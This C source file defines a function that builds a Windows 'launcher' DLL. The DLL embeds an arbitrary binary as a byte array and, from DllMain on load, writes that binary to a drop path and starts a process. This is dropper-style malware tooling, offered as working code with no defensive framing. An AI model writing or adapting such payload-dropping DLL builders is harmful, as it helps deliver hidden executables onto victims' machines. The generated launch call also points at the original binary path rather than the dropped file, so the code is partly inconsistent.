#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "config.h"

extern int write_binary_to_file(const char *path, const void *data, size_t size);
extern int create_process(const char *path);

int build_launcher_dll(const char *binary_path, const char *dll_out_path) {
    FILE *binary_file = fopen(binary_path, "rb");
    if (!binary_file) return -1;

    fseek(binary_file, 0, SEEK_END);
    long binary_size = ftell(binary_file);
    fseek(binary_file, 0, SEEK_SET);

    unsigned char *binary_data = (unsigned char *)malloc(binary_size);
    if (!binary_data) {
        fclose(binary_file);
        return -1;
    }

    if (fread(binary_data, 1, binary_size, binary_file) != (size_t)binary_size) {
        free(binary_data);
        fclose(binary_file);
        return -1;
    }

    fclose(binary_file);

    FILE *dll_file = fopen(dll_out_path, "wb");
    if (!dll_file) {
        free(binary_data);
        return -1;
    }

    const char dll_code[] = 
        "#include <windows.h>\n"
        "const unsigned char g_binaryData[] = {";
    fwrite(dll_code, 1, sizeof(dll_code) - 1, dll_file);

    for (long i = 0; i < binary_size; i++) {
        if (i > 0) fprintf(dll_file, ",");
        fprintf(dll_file, "0x%02X", binary_data[i]);
    }

    const char dll_end[] = 
        "};\n"
        "const DWORD g_binarySize = sizeof(g_binaryData);\n"
        "BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n"
        "    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {\n"
        "        HANDLE hFile = CreateFileA(DROP_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n"
        "        if (hFile != INVALID_HANDLE_VALUE) {\n"
        "            DWORD bytesWritten;\n"
        "            WriteFile(hFile, g_binaryData, g_binarySize, &bytesWritten, NULL);\n"
        "            CloseHandle(hFile);\n"
        "        }\n"
        "        STARTUPINFOA si = { sizeof(si) };\n"
        "        PROCESS_INFORMATION pi;\n"
        "        if (CreateProcessA(NULL, (LPSTR)\"%s\", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {\n"
        "            CloseHandle(pi.hProcess);\n"
        "            CloseHandle(pi.hThread);\n"
        "        }\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n";
    fprintf(dll_file, dll_end, binary_path);

    fclose(dll_file);
    free(binary_data);
    return 0;
}